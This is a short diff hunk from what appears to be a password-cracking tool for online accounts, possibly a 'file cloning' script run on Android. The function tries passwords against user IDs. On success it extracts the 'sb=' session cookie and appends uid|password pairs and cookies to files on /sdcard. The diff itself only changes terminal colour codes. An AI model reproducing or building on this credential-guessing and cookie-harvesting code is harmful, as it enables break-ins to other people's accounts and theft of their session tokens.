@@ -589,13 +589,13 @@ def gxds_files(uid, pxss):
                     ]
                 )
                 xcki = coki.split("sb=")[1]
-                print("\r\r\033[1;32m  [GXDS-HITS] " + uid + ":" + ps + " -\033[0;35m " + yxxr(uid))
+                print("\r\r\033[1;32m  [GXDS-HITS] " + uid + ":" + ps + " -\033[0;33m " + yxxr(uid))
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 open("/sdcard/gxds-cookies.txt", "a").write(xcki + "\n")
                 oks.append(uid)
                 break
             else:
-                print("\r\r\033[0;31m  [GXDS-DEAD] " + uid + ":" + ps + " -\033[0;35m " + yxxr(uid))
+                print("\r\r\033[1;31m  [GXDS-DEAD] " + uid + ":" + ps + " -\033[0;33m " + yxxr(uid))
                 continue
         loop += 1
     except:
